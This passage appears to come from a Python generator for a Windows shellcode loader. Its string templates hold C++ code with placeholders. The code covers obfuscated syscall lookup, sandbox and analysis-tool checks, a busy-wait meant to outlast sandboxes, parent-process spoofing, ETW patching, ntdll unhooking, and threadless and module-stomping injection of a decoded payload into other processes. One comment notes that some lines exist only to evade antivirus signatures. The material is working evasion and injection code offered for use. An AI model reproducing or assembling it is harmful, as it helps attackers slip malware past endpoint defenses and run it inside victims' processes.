    NewNtClose = (myNtClose)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
    NtOpenProcess = (myNtOpenProcess)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "Q" + "u" + "e" + "u" + "e" + "A" + "p" + "c" + "T" + "h" + "r" + "e" + "a" + "d";
    NtQueueApcThread = (myNtQueueApcThread)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "A" + "l" + "e" + "r" + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
    NtAlertResumeThread = (myNtAlertResumeThread)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "G" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
    NtGetContextThread = (myNtGetContextThread)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "S" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
    NtSetContextThread = (myNtSetContextThread)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
    scall = std::string("N") + "t" + "D" + "e" + "l" + "a" + "y" + "E" + "x" + "e" + "c" + "u" + "t" + "i" + "o" + "n";
    NtDelayExecution = (myNtDelayExecution)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
"""

sleep_check = """
BOOL SleepCheck() {
    ULONG64 timeBeforeSleep = GetTickCount64();

    for (;;) {

        int flag = 0;
        for (int n = 1; n < 5555; n++) {
            if (n == 0 || n == 1)
                flag = 1;

            for (int i = 2; i <= n / 2; ++i) {
                if (n % i == 0) {
                    flag = 1;
                    break;
                }
            }
        }

        ULONG64 timeAfterSleep = GetTickCount64();
        if (timeAfterSleep - timeBeforeSleep > 10000) {
            break;
        }
    }
}
"""

hostname_sanbox_check = """
int hostcheck()
{
    char hostname[64];
    DWORD hostnamesize = 64;
    GetComputerNameA(hostname, &hostnamesize);
    if (strcmp(hostname, skCrypt("REPLACE_ME_HOSTNAME")) != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

username_sanbox_check = """
int usercheck()
{
    char username[4000];
    DWORD usernameamesize = 4000;
    GetUserName(username, &usernameamesize);
    if (strcmp(username, skCrypt("REPLACE_ME_USERNAME")) != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

domain_sanbox_check = """
int domaincheck()
{
    char domain[164];
    DWORD domainsize = 164;
    GetComputerNameEx(ComputerNameDnsDomain, domain, &domainsize);
    if (strcmp(domain, skCrypt("REPLACE_ME_DOMAINNAME")) != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

dll_sandbox_check = """
int PrintModules(DWORD processID)
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)processID;
    // Print the process identifier.
    //printf("\\nProcess ID: %u\\n", processID);
    // Get a handle to the process.
    NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
    if (NULL == hProcess)
        return 1;
    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];
            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
                sizeof(szModName) / sizeof(TCHAR)))
            {
                //std::string target = L"Dbghelp.dll";
                String dang = szModName;
                //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
                if (dang.find("SbieDll.dll") != std::string::npos || dang.find("Api_log.dll") != std::string::npos || dang.find("Dir_watch.dll") != std::string::npos || dang.find("dbghelp.dll") != std::string::npos)
                {
                    // Print the module name and handle value.
                    //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                    return 2;
                }
                
            }
        }
    }
    // Release the handle to the process.
    NewNtClose(hProcess);
    return 0;
}

int getLoadedDlls()
{
    DWORD aProcesses[1024];
    DWORD cbNeeded;
    DWORD cProcesses;
    unsigned int i;
    // Get the list of process identifiers.
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        return 1;
    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);
    // Print the names of the modules for each process.
    int result;
    int done = 0;
    DWORD saved;
    //Loop for dlls. Loop will continue until dlls are found to bypass sandboxing.
    while (done != 2)
    {
        for (i = 0; i < cProcesses; i++)
        {
            result = PrintModules(aProcesses[i]);
            if (result == 2)
            {
                done = result;
                saved = aProcesses[i];
            }
        }
    }
    return 0;
}
"""

# Thanks to @Snovvcrash for helping improve PPID spoofing
ppid_priv_check = """
                if (GetProcElevation(entry.th32ProcessID))
                {
                    CLIENT_ID cID;
                    cID.UniqueThread = 0;
                    cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                    OBJECT_ATTRIBUTES oa;
                    InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                    if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                    {
                        NewNtClose(snapshot);
                        return hProcess;
                    }
                    else
                    {
                        NewNtClose(snapshot);
                        return INVALID_HANDLE_VALUE;
                    }
                }
"""

ppid_unpriv_check = """
                DWORD sessionID;
                ProcessIdToSessionId(GetCurrentProcessId(), &sessionID);
                if (sessionID == GetProcSessionID(entry.th32ProcessID))
                {
                    CLIENT_ID cID;
                    cID.UniqueThread = 0;
                    cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                    OBJECT_ATTRIBUTES oa;
                    InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                    if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                    {
                        NewNtClose(snapshot);
                        return hProcess;
                    }
                    else
                    {
                        NewNtClose(snapshot);
                        return INVALID_HANDLE_VALUE;
                    }
                }
"""

get_proc_session_ID = """
DWORD GetProcSessionID(DWORD procID)
{
    HANDLE hProcess = NULL;

    CLIENT_ID cID;
    cID.UniqueThread = 0;
    cID.UniqueProcess = UlongToHandle(procID);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, 0, 0, 0, 0);

    NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cID);

    HANDLE hToken;
    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_QUERY_SOURCE, &hToken))
    {
        DWORD dwTokLen = GetTokenInfoLength(hToken, TokenSessionId);
        LPDWORD lpSessionId = (LPDWORD)VirtualAlloc(nullptr, dwTokLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        DWORD dwRetLen;
        if (GetTokenInformation(hToken, TokenSessionId, lpSessionId, dwTokLen, &dwRetLen))
            return *lpSessionId;
    }
    return 0;
}
"""

get_proc_elevation = """
DWORD GetProcElevation(DWORD procID)
{
    HANDLE hProcess = NULL;

    CLIENT_ID cID;
    cID.UniqueThread = 0;
    cID.UniqueProcess = UlongToHandle(procID);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, 0, 0, 0, 0);

    NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cID);

    HANDLE hToken;
    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_QUERY_SOURCE, &hToken))
    {
        DWORD dwTokLen = GetTokenInfoLength(hToken, TokenElevation);
        DWORD dwRetLen;
        TOKEN_ELEVATION_TYPE elevType;
        if (GetTokenInformation(hToken, TokenElevation, &elevType, dwTokLen, &dwRetLen)) {
            return elevType;
        }
    }
    return 0;
}
"""

process_functions = """
DWORD GetTokenInfoLength(HANDLE hToken, TOKEN_INFORMATION_CLASS tokClass)
{
    DWORD dwRetLength = 0x0;
    GetTokenInformation(hToken, tokClass, NULL, 0x0, &dwRetLength);

    return dwRetLength;
}

REPLACE_GET_PROC_TOKEN_FUNCTION

HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                REPLACE_PPID_PRIV_CHECK
            }
        }
    }
    NewNtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);
    
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    REPLACE_PPID_SPOOF
    
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT | STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}
"""

get_parent_handle_stub_only = """
HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    NewNtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NewNtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NewNtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}
"""

# Thanks to TheD1rkMtr for this code: https://github.com/TheD1rkMtr/ntdlll-unhooking-collection
unhook_ntdll = """
//START UNHOOKING CODE
BOOL DisableETW(void) {
    DWORD oldprotect = 0;

    char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
    char sntdll[] = { 'n','t','d','l','l', 0 };

    //      xor rax, rax; 
    //      ret
    char patch[] = { 0x48, 0x33, static_cast<char> (0xc0), static_cast<char> (0xc3) };


    void* addr = (PVOID)GetProcAddress(GetModuleHandleA(sntdll), sEtwEventWrite);
    if (!addr) {
        safe_print(skCrypt("Failed to get EtwEventWrite Addr (%u)\\n"), GetLastError());
        return FALSE;
    }
    BOOL status1 = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!status1) {
        safe_print(skCrypt("Failed in changing protection (%u)\\n"), GetLastError());
        return FALSE;
    }

    memcpy(addr, patch, sizeof(patch));


    BOOL status2 = VirtualProtect(addr, 4096, oldprotect, &oldprotect);

    if (!status2) {
        safe_print(skCrypt("Failed in changing protection back (%u)\\n"), GetLastError());
        return FALSE;
    }

    return TRUE;
}


LPVOID MapNtdll() {

    UNICODE_STRING DestinationString;
    const wchar_t SourceString[] = { '\\\\','K','n','o','w','n','D','l','l','s','\\\\','n','t','d','l','l','.','d','l','l', 0 };

    RtlInitUnicodeString(&DestinationString, SourceString);

    OBJECT_ATTRIBUTES   ObAt;
    InitializeObjectAttributes(&ObAt, &DestinationString, OBJ_CASE_INSENSITIVE, NULL, NULL );


    HANDLE hSection;
    NTSTATUS status1 = NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObAt);
    if (!NT_SUCCESS(status1)) {
        safe_print(skCrypt("[!] Failed in NtOpenSection (%u)\\n"), GetLastError());
        return NULL;
    }
    
    PVOID pntdll = NULL;
    ULONG_PTR ViewSize = NULL;
    PVOID JUNKVAR = NULL;
    NTSTATUS status2 = NtMapViewOfSection(hSection, NtCurrentProcess(), &pntdll, 0, 0, NULL, &ViewSize, 1, 0, PAGE_READONLY);
    if (!NT_SUCCESS(status2)) {
        safe_print(skCrypt("[!] Failed in NtMapViewOfSection (%u)\\n"), GetLastError());
        return NULL;
    }
    return pntdll;
}

BOOL Unhook(LPVOID module) {

    HANDLE hntdll = GetModuleHandleA(Nt);

    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(module)+DOSheader->e_lfanew);
    if (!NTheader) {
        safe_print(skCrypt(" [-] Not a PE file\\n"));
        return FALSE;
    }

    PIMAGE_SECTION_HEADER sectionHdr = IMAGE_FIRST_SECTION(NTheader);
    DWORD oldprotect = 0;

    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {

        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {
            BOOL status1 = VirtualProtect((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!status1) {
                return FALSE;
            }

            memcpy((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)module + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);

            BOOL status2 = VirtualProtect((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!status2) {
                return FALSE;
            }

        }
        return TRUE;
    }

}
//end unhooking code
"""

threadless_definitions = """
//START THREADLESS DEFINITIONS
typedef struct _LDR_MODULE {
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
    PVOID                   BaseAddress;
    PVOID                   EntryPoint;
    ULONG                   SizeOfImage;
    UNICODE_STRING          FullDllName;
    UNICODE_STRING          BaseDllName;
    ULONG                   Flags;
    SHORT                   LoadCount;
    SHORT                   TlsIndex;
    LIST_ENTRY              HashTableEntry;
    ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

//END THREADLESS DEFINITIONS
"""

threadless_functions = """
//START THREADLESS FUNCTIONS
void GenerateHook(UINT_PTR originalInstructions, char* shellcodeLoader)
{
    for (int i = 0; i < 8; i++)
        shellcodeLoader[18 + i] = ((char*)&originalInstructions)[i];
}


UINT_PTR findMemoryHole(HANDLE proc, UINT_PTR exportAddr, SIZE_T size)
{
    UINT_PTR remoteLdrAddr;
    BOOL foundMem = FALSE;
    NTSTATUS status;

    for (remoteLdrAddr = (exportAddr & 0xFFFFFFFFFFF70000) - 0x70000000;
        remoteLdrAddr < exportAddr + 0x70000000;
        remoteLdrAddr += 0x10000)
    {
        status = NtAllocateVirtualMemory(proc, (PVOID*)&remoteLdrAddr, 0, &size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READ);
        if (status != 0)
            continue;

        foundMem = TRUE;
        break;
    }

    return foundMem ? remoteLdrAddr : 0;
}
//END THREADLESS 
"""

threadless_inject_create_stub = """
    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;

    NTSTATUS status;
    HANDLE pHandle = pi.hProcess;
    // I found a short sleep after creating the process before the threadless-inject helps prevent it from crashing
    safe_print(skCrypt("Sleeping for 20 seconds..."));
    Sleep(20000);
"""

threadless_inject_nocreate_stub = """
    NTSTATUS status;
    HANDLE pHandle = GetParentHandle(skCrypt("REPLACE_GET_PROCESS_ARG"));
"""

# Majority of code from 0xLegacyy, modified for our needs: https://github.com/iilegacyyii/ThreadlessInject-BOF
threadless_inject_stub = """

    REPLACE_ME_SLEEP_CALL
    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
    //REPLACE_ME_SANDBOX_CALL
    REPLACE_ME_CALL_UNHOOK
    REPLACE_ME_SYSCALL_STUB_P2
    deC(REPLACE_ME_DECARG);

    SIZE_T bytesWritten;
    SIZE_T pnew = payload_len;
    LPCSTR targetDllName;
    LPCSTR targetFunctionName;
    SIZE_T shellcodeSize = 0;

    char targetDllNameArr[] = { REPLACE_THREADLESS_TARGET_DLL, 0 };
    char targetfuncArr[] = { REPLACE_EXPORT_FUNCTION, 0 };
    targetDllName = targetDllNameArr;
    targetFunctionName = targetfuncArr;


    printf(skCrypt("Injecting into target process, executing via %s!%s\\n"), targetDllName, targetFunctionName);

    char shellcodeLoader[] = {
        0x58, 0x48, static_cast<char>(0x83), static_cast<char>(0xE8), 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, static_cast<char>(0xB9),
        static_cast<char>(0x88), 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, static_cast<char>(0x89), 0x08, 0x48, static_cast<char>(0x83), static_cast<char>(0xEC), 0x40, static_cast<char>(0xE8), 0x11, 0x00,
        0x00, 0x00, 0x48, static_cast<char>(0x83), static_cast<char>(0xC4), 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, static_cast<char>(0xFF),
        static_cast<char>(0xE0), static_cast<char>(0x90)
    };

    // Get address of target function
    HMODULE dllBase = GetModuleHandle(targetDllName);
    if (dllBase == NULL)
    {
        printf(skCrypt("Unable to locate base address of %s"), targetDllName);
        return 1;
    }

    UINT_PTR exportAddress = (UINT_PTR)GetProcAddress(dllBase, targetFunctionName);
    if (exportAddress == 0)
    {
        printf(skCrypt("Unable to locate base address of %s!%s"), targetDllName, targetFunctionName);
        return 1;
    }
    //printf("%s!%s @ 0x%llx", targetDllName, targetFunctionName, exportAddress);

    REPLACE_THREADLESS_CREATE_PROCESS

    // Locate memory hole for shellcode to reside in.
    UINT_PTR loaderAddress = findMemoryHole(pHandle, exportAddress, sizeof(shellcodeLoader) + pnew);
    if (loaderAddress == 0)
    {
        safe_print(skCrypt("Unable to locate memory hole within 2G of export address"));
        NewNtClose(pHandle); pHandle = NULL;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Allocated region @ 0x%llx", loaderAddress);

    // Get original 8 bytes at export address
    UINT_PTR originalBytes = 0;
    for (int i = 0; i < 8; i++) ((BYTE*)&originalBytes)[i] = ((BYTE*)exportAddress)[i];

    // Setup the call 0x1122334455667788 in the shellcodeLoader
    GenerateHook(originalBytes, shellcodeLoader);

    // Change exportAddress memory to rwx, have to do this to stop the target process potentially crashing (IoC)
    SIZE_T regionSize = 8;
    ULONG oldProtect = 0;
    UINT_PTR targetRegion = exportAddress;
    status = NtProtectVirtualMemory(pHandle, (PVOID*)&targetRegion, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0)
    {
        printf(skCrypt("Unable to change page protections @ 0x%llx, status: 0x%llx"), targetRegion, status);
        NewNtClose(pHandle); pHandle = NULL;
    }

    // Calculate callOpCode & write to export
    UINT_PTR relativeLoaderAddress = loaderAddress - (exportAddress + 5);
    char callOpCode[] = { static_cast<char>(0xe8), 0, 0, 0, 0 };
    for (int i = 0; i < 4; i++)
        callOpCode[1 + i] = ((char*)&relativeLoaderAddress)[i];

    //ULONG bytesWritten = 0;
    targetRegion = exportAddress;
    status = NtWriteVirtualMemory(pHandle, (PVOID)targetRegion, (PVOID)callOpCode, sizeof(callOpCode), &bytesWritten);
    if (status != 0 || bytesWritten != sizeof(callOpCode))
    {
        printf(skCrypt("Unable to write call opcode @ 0x%llx, status: 0x%llx"), exportAddress, status);
        NewNtClose(pHandle); pHandle = NULL;
    }
    //printf("Wrote call opcode @ 0x%llx", exportAddress);

    // Change loaderAddress protections to rw
    regionSize = sizeof(shellcodeLoader) + pnew;
    status = NtProtectVirtualMemory(pHandle, (PVOID*)&loaderAddress, &regionSize, PAGE_READWRITE, &oldProtect);
    if (status != 0)
    {
        printf(skCrypt("Unable to change page protections @ 0x%llx, status: 0x%llx"), loaderAddress, status);
        NewNtClose(pHandle); pHandle = NULL;
    }

    // Write payload to address (2 writes here because I cba to concat the two buffers)
    status = NtWriteVirtualMemory(pHandle, (PVOID)loaderAddress, (PVOID)shellcodeLoader, sizeof(shellcodeLoader), &bytesWritten);
    if (status != 0 || bytesWritten != sizeof(shellcodeLoader))
    {
        printf(skCrypt("Unable to write loader stub @ 0x%llx, status: 0x%llx"), loaderAddress, status);
        NewNtClose(pHandle); pHandle = NULL;
    }

    status = NtWriteVirtualMemory(pHandle, (PVOID)(loaderAddress + sizeof(shellcodeLoader)), decoded, pnew, &bytesWritten);
    if (status != 0 || bytesWritten != pnew)
    {
        printf(skCrypt("Unable to write payload @ 0x%llx, status: 0x%llx"), loaderAddress + pnew, status);
        NewNtClose(pHandle); pHandle = NULL;
    }

    // Restore original protections
    status = NtProtectVirtualMemory(pHandle, (PVOID*)&loaderAddress, &regionSize, oldProtect, &oldProtect);
    if (status != 0)
    {
        printf(skCrypt("Unable to change page protections @ 0x%llx, status: 0x%llx"), loaderAddress, status);
        NewNtClose(pHandle); pHandle = NULL;
    }

    safe_print(skCrypt("Injection complete. Payload will execute when the targeted process calls the export"));

    return 0;
"""

module_stomping_stub = """

    REPLACE_ME_SLEEP_CALL
    HANDLE processHandle;
    PVOID remoteBuffer;
    auto moduleToInject = skCrypt("mstscax.dll");
    auto moduleFunction = skCrypt("DllCanUnloadNow");
    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;

    REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
    //REPLACE_ME_SANDBOX_CALL
    REPLACE_ME_CALL_UNHOOK
    REPLACE_ME_SYSCALL_STUB_P2
    deC(REPLACE_ME_DECARG);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    processHandle = pi.hProcess;

    LPVOID test = (LPVOID)GetProcAddress(LoadLibraryA(TEXT("Kernel32.dll")), skCrypt("LoadLibraryExA"));
    unsigned char adr[8];
    *(uintptr_t*)adr = (uintptr_t)test; 

    unsigned char shim[] =  {0x48, 0xB8, adr[0], adr[1], adr[2], adr[3], adr[4], adr[5], adr[6],adr[7],
            0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
            0x48, 0x31, 0xD2,
            0xFF, 0xE0};

    LPVOID allocModule = NULL;
    LPVOID allocShim = NULL;
    SIZE_T bytesWritten;
    HANDLE hThread;
    ULONG oldProtect = 0;
    SIZE_T moduleSize = sizeof(moduleToInject) + 2;
    SIZE_T shimSize = sizeof shim;

    res = NtAllocateVirtualMemory(processHandle, &allocModule, 0, &moduleSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    safe_print(skCrypt("NtAllocateVirtualMemory res (allocModule): "), res);
    res = NtAllocateVirtualMemory(processHandle, &allocShim, 0, &shimSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    safe_print(skCrypt("NtAllocateVirtualMemory res (allocShim): "), res);
    
    auto eString = skCrypt("allocShim:   ");
    printf("%s%#p\\n", eString.decrypt(), allocShim);
    eString.clear();
    eString = skCrypt("allocModule: ");
    printf("%s%#p\\n", eString.decrypt(), allocModule);
    eString.clear();

    res = NtWriteVirtualMemory(processHandle, allocModule, moduleToInject, sizeof moduleToInject, &bytesWritten);
    safe_print(skCrypt("NtWriteVirtualMemory res (moduleToInject): "), res);
    res = NtWriteVirtualMemory(processHandle, allocShim, shim, shimSize, &bytesWritten);
    safe_print(skCrypt("NtWriteVirtualMemory res (Shim): "), res);
    if (res != 0)
    {
        safe_print(skCrypt("[!] NtWriteVirtualMemory FAILED! This happens occassionally due to an unkown bug."));
        return 1;
    }

    //Flip RW bit to RX for shim execution
    res = NtProtectVirtualMemory(processHandle, &allocShim, &shimSize, PAGE_EXECUTE_READ, &oldProtect);
    safe_print(skCrypt("NtProtectVirtualMemory res (Shim): "), res);

    res = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, allocShim, allocModule, FALSE, 0, 0, 0, NULL);
    safe_print(skCrypt("NtCreateThreadEx res (Shim): "), res);
    res = NewNtWaitForSingleObject(hThread, -1, NULL);
    safe_print(skCrypt("NtWaitForSingleObject res (Shim): "), res);

    HMODULE xps = LoadLibraryExA(moduleToInject, NULL, DONT_RESOLVE_DLL_REFERENCES);
    LPVOID funcAddress = (LPVOID)GetProcAddress(xps, moduleFunction);

    eString = skCrypt("funcAddress: ");
    printf("%s%#p\\n", eString.decrypt(), funcAddress);
    eString.clear();

    PVOID f2 = (PVOID)funcAddress;
    long funcOffset = (uintptr_t)f2 - (uintptr_t)xps;

    auto eString2 = skCrypt("funcOffset: ");
    printf("%s%#p\\n", eString2.decrypt(), funcOffset);
    eString2.clear();

    HMODULE hMods[1024];
    DWORD cbNeeded;

    LPVOID moduleBaseAddr;

    if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded))
    {
        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];
            // Get the full path to the module's file.
            if (GetModuleFileNameEx(processHandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
            {
                String dang = szModName;
                if (dang.find(moduleToInject) != std::string::npos)
                {
                    _tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                    moduleBaseAddr = hMods[i];
                    safe_print(skCrypt("Module found"));
                    auto eString3 = skCrypt("szModName: ");
                    printf("%s%s\\n", eString3.decrypt(), szModName);
                    eString3.clear();
                    auto eString4 = skCrypt("Baseaddr: ");
                    printf("%s%#p\\n", eString4.decrypt(), hMods[i]);
                    eString4.clear();
                }
            }
        }
    }

    LPVOID remoteFuncAddress = (LPVOID)((uintptr_t)moduleBaseAddr + (uintptr_t)funcOffset);

    auto eString5 = skCrypt("remoteFuncAddress: ");
    printf("%s%#p\\n", eString5.decrypt(), remoteFuncAddress);
    eString5.clear();

    SIZE_T shellcodeLen = payload_len;
    SIZE_T bytesWritten2;

    uintptr_t jankOffset = (uintptr_t)remoteFuncAddress % (0x1000);
    auto eString6 = skCrypt("jankOffset: ");
    printf("%s%#p\\n", eString6.decrypt(), jankOffset);
    eString6.clear();

    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, PAGE_READWRITE, &oldProtect);
    safe_print(skCrypt("NtProtectVirtualMemory res (shellcode): "), res);
    res = NtWriteVirtualMemory(processHandle, (LPVOID)((uintptr_t)remoteFuncAddress + jankOffset), decoded, shellcodeLen, &bytesWritten2);
    safe_print(skCrypt("NtWriteVirtualMemory res (shellcode): "), res);

    // Flip RW bit to RX
    res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
    safe_print(skCrypt("NtProtectVirtualMemory res (shellcode): "), res);

    HANDLE hThread2;
    res = NtCreateThreadEx(&hThread2, GENERIC_EXECUTE, NULL, processHandle, funcAddress, NULL, FALSE, 0, 0, 0, NULL);
    safe_print(skCrypt("NtCreateThreadEx res (shellcode): "), res);

    NewNtClose(hThread);
    NewNtClose(hThread2);
    NewNtClose(processHandle);
    return 0;
"""

